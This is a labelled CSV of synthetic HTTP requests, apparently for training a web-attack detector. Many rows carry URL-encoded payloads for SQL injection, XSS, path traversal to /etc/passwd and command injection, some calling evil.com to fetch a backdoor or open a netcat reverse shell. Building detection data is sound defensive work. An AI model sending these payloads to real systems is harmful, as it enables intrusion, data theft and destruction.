text,label
OPTIONS /api/v2/analytics?price_min=710&tag=659&last_name=system+log+entry&columns=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&comment=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /images/logo.png page=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /images/logo.png id=816&limit=638 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/v1/data?search_term=535&filter=please%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20attached&view=this+is+a+normal+comment&category=755&last_name=663 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /settings?name=../../../etc/passwd&date=admin+access+request&rating=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /register?user_id=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?search=524&action=contact+me+at+email@example.com&format=795&search_term=41 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about order_id=John%20%27%20AND%201%3D2--%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /settings?tags=system%20%7Cc%27a%27t%20/etc/passwd%20email%40example.com&columns=system+log+entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /users/456 id=441&status=thank+you&q=359&action=%7C%20cat%20/etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /docs/api?status=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /settings?token=123+Main+St&filters=717&username=123%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /help/faq author=%3Csvg%20onload%3Dalert%281%29%3E&price_max=123+Main+St&city=hello+world&content=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /users/456?lang=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&columns=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /help/faq?tracking=this%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /images/logo.png?q=this+is+a+normal+comment&quantity=my+address+is&password=714&city=954 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /contact?phone=312&user_id=admin%20%26%20whoami%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /posts/789?status=test+user&format=123%20%27%3B%20DROP%20TABLE%20users--%20regards&first_name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /contact?tag=333&status=system%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /profile?old_password=525&page=548&tracking=287 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /dashboard?id=I+would+like+to+order&user_id=82&age=608 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /api/v1/data?order_id=211&title=704&view=23 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/orders?color=contact+me+at+email@example.com&price_min=hello+world User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products order_id=%27%20AND%201%3D2--&name=hello+world&q=844&color=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /api/reports city=admin+access+request&price_min=I+would+like+to+order&last_name=hello%20%27%20AND%20%27x%27%3D%27x%20order&format=647 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 first_name=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /posts/789?name=I+would+like+to+order&columns=186&action=217&first_name=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/v1/data status=admin+access+request&token=923&order_id=56&phone=best%20%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%20attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /posts/789 view=my+address+is&user_id=381&region=288&limit=49&price_min=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /posts/789 region=240 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /js/app.js?last_name=John+Doe&status=633&price_min=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /settings?search_term=602&action=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd&order_id=936&password=please+find+attached&tags=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/users content=system+log+entry&email=John%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20Doe&quantity=I+would+like+to+order User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /images/logo.png?author=file%3A///etc/passwd&price_max=454&age=admin+access+request&last_name=179 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /login title=%27%20OR%20%271%27%3D%271%27-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /login tag=best%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20world&format=test+user&city=contact+me+at+email@example.com&quantity=886&username=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/users?title=best%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?action=I+would+like+to+order&age=this+is+a+normal+comment&tag=please+find+attached&new_password=546&email=hello%20....//....//....//etc/passwd%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /about action=contact+me+at+email@example.com&email=my+address+is&color=607&category=best+regards&type=941 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /register?order=hello+world&email=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
DELETE /api/v1/data?color=252&date=228&old_password=this%20%27%20AND%20%27x%27%3D%27y%20entry&last_name=27 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /help/faq?username=my%20%3B%20rm%20-rf%20/%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact token=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /js/app.js age=contact+me+at+email@example.com&city=....//....//....//etc/passwd&order_id=391&columns=555&last_name=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /posts/789 status=%60id%60&city=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /login sort=789 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PUT /settings session=John%20%27%20OR%20%271%27%3D%271%27--%20you&token=316&columns=373&sort=99&type=497 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /images/logo.png?new_password=870&view=best+regards&city=John%20%27%20AND%201%3D1--%20comment&type=this+is+a+normal+comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/search?email=521&columns=hello%20admin%27%20OR%20%271%27%3D%271%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /contact type=my%20%27%3B%20DROP%20TABLE%20users--%20Doe&tag=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /login?city=please%20%27%20AND%20%27x%27%3D%27x%20attached&date=824 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/orders rating=this%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/search title=system+log+entry&color=test%20admin%27%23%20is&filter=888 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /about?content=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /dashboard?view=system+log+entry&product_id=492&color=please+find+attached&old_password=494 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /dashboard?age=test%20%24%28cat%20/etc/shadow%29%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /products/123?new_password=hello%20....//....//....//etc/passwd%20is User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/users lang=123%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20St&region=best+regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?tag=contact%20%3Csvg/onload%3Dalert%281%29%3E%20St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /profile price_max=best+regards&last_name=admin+access+request&password=%7Cc%27a%27t%20/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /api/users?password=%3Csvg/onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/v2/analytics title=my+address+is&format=123+Main+St&email=480&filters=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /js/app.js?type=please+find+attached&date=614&title=%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /login?page=please+find+attached&region=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&password=976 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /posts/789?name=hello+world&columns=484&comment=best+regards&username=764&action=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /help/faq columns=please%20admin%27%20OR%20%271%27%3D%271%20comment User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/search?title=580 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /products/123?status=70&lang=admin%20%27%20OR%20%271%27%3D%271%27--%20you&q=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/v1/data?search=this%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20email%40example.com&author=hello+world&phone=952 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /users/456 user_id=671&comment=764&color=this%20%3Csvg/onload%3Dalert%281%29%3E%20entry&region=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /settings?product_id=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /dashboard columns=test+user&comment=%27%20OR%20%271%27%3D%271%27--&user_id=test+user&password=I+would+like+to+order&last_name=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /login?phone=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /register?old_password=578&order_id=contact%20%7C%20curl%20http%3A//evil.com/backdoor%20is&columns=44 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /about tag=925&quantity=123+Main+St&content=394 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /images/logo.png?id=916 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PATCH /api/v1/data title=this+is+a+normal+comment&sort=test+user&old_password=my+address+is&id=947&new_password=986 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /docs/api q=%7Cc%27a%27t%20/etc/passwd&filter=123+Main+St&phone=847 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /login?new_password=387&order=%3B%20rm%20-rf%20/&filters=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/v2/analytics?status=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&order_id=my+address+is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/search?tags=65&format=I%20file%3A///etc/passwd%20request&city=please+find+attached&price_max=thank+you&user_id=920 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/reports tags=test%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20is&search_term=503&age=810 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /settings?region=%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E&username=this+is+a+normal+comment&tags=806&filter=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /settings order=admin%20%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%20regards&price_max=contact+me+at+email@example.com&category=123+Main+St&title=634 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/orders?old_password=John+Doe&region=%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /users/456?view=this%20%27%20UNION%20SELECT%20%40%40version%2CNULL%2CNULL--%20St&lang=846&search=614&date=John+Doe User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /js/app.js?category=376&filters=my+address+is&page=admin+access+request&region=372 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /users/456?new_password=thank%20%3Csvg%20onload%3Dalert%281%29%3E%20entry&first_name=test+user&search_term=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/users?first_name=this%20%3Ca%20href%3D%27javascript%3Aalert%281%29%27%3Eclick%3C/a%3E%20world User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /contact?tags=John+Doe&view=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /images/logo.png?type=hello+world&view=system+log+entry&sort=383&password=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /contact?color=contact+me+at+email@example.com&old_password=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /dashboard?password=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /login?order_id=best+regards&id=444&comment=my+address+is&filter=226&password=test+user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
POST /docs/api name=please%20%27%3B%20DROP%20TABLE%20users--%20user&date=898&rating=807&price_min=598&city=242 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /settings rating=contact+me+at+email@example.com&phone=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&search_term=763 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /api/products?type=638&sort=system%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20St&username=admin+access+request&author=I+would+like+to+order User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /users/456 user_id=thank+you&quantity=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&filters=500&username=admin+access+request&limit=this+is+a+normal+comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /contact?password=123%20%60id%60%20St&author=796 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /api/reports last_name=963 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /js/app.js?first_name=225&token=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
PUT /users/456 tracking=test+user&filters=%27%20OR%201%3D1--&format=159&filter=331 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v1/data session=705&quantity=best%20%7Cc%27a%27t%20/etc/passwd%20regards&tags=please+find+attached&token=284&q=33 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /register?name=975&limit=920&columns=my+address+is&filters=John%20%27%3B%20SELECT%20pg_sleep%285%29--%20is&email=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /api/v2/analytics old_password=thank+you&date=please%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20attached&new_password=140&content=admin+access+request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/v2/analytics filter=this+is+a+normal+comment&price_min=845 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?filters=632&tag=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /register?comment=/var/www/../../etc/passwd&page=test+user&title=please+find+attached&new_password=283 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PATCH /docs/api name=519&filter=hello+world&first_name=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /api/orders?lang=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /images/logo.png?filters=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&order=474&filter=contact+me+at+email@example.com&email=I+would+like+to+order User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /products/123?status=please%20%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E%20you&age=325 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /docs/api?username=please+find+attached&city=725&age=434 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/orders?username=954&comment=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&new_password=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /login?tag=system+log+entry&category=thank%20%3Csvg/onload%3Dalert%281%29%3E%20request&new_password=123+Main+St User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /js/app.js view=867&token=my+address+is&filters=980&price_max=my+address+is&search=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /settings?tracking=file%3A///etc/passwd&date=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /about?city=test+user&email=contact+me+at+email@example.com&tag=26&limit=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&status=387 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /contact page=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
HEAD /login?content=thank%20%3B%20ls%20-la%20attached&status=admin+access+request User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /dashboard?limit=system+log+entry&first_name=....//....//....//etc/passwd&status=234&rating=548&tags=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /api/reports name=system%20%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20email%40example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /posts/789 email=919&rating=123+Main+St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /css/style.css?age=thank+you&comment=I%20%27%3B%20SELECT%20pg_sleep%285%29--%20is&color=404&rating=49 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /api/orders?type=please+find+attached&lang=149&rating=693&sort=thank%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20entry&price_max=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /profile?action=%27%20AND%201%3D2--&search=302&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /settings price_max=123%20%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29%20user&search=587 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /js/app.js?search=%3Csvg/onload%3Dalert%281%29%3E&order=388&format=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /posts/789 last_name=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /profile?author=107&action=my+address+is&product_id=test+user&email=373 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /about tag=thank+you&region=system+log+entry&action=John+Doe&status=%3Csvg%20onload%3Dalert%281%29%3E&new_password=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /posts/789?age=349&price_max=991&status=hello+world&last_name=I+would+like+to+order&title=/var/www/../../etc/passwd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /api/users?age=please+find+attached&color=John+Doe&rating=test+user&lang=211&title=123%20%27%20AND%201%3D1--%20user User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/v2/analytics?limit=411&rating=694&tag=132&title=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /users/456?lang=865&email=contact%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20attached&comment=John+Doe User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/orders?lang=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&page=36&comment=591 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /login?title=859&price_min=307&region=I%20%3B%20rm%20-rf%20/%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /settings view=system+log+entry&category=682&last_name=461&name=admin+access+request&filter=thank+you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
PATCH /api/v1/data username=best%20%27%20OR%20%271%27%3D%271%27--%20Doe&comment=contact+me+at+email@example.com&age=339 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /docs/api?session=188&comment=admin+access+request&age=please+find+attached&color=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/v2/analytics tracking=941 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
HEAD /help/faq?lang=admin%20%3Cbody%20onload%3Dalert%28document.domain%29%3E%20regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PUT /api/v2/analytics search_term=admin%27%23 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /api/reports?tags=file%3A///etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/search?last_name=I%20%3B%20wget%20http%3A//evil.com/shell.sh%20world&phone=please+find+attached&first_name=963 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /css/style.css?color=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/reports region=284&status=my+address+is&limit=42 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /docs/api price_min=475&token=../../../etc/passwd&old_password=868&sort=hello+world User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /about first_name=John+Doe&author=258&password=admin+access+request&phone=I+would+like+to+order&quantity=admin+access+request User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
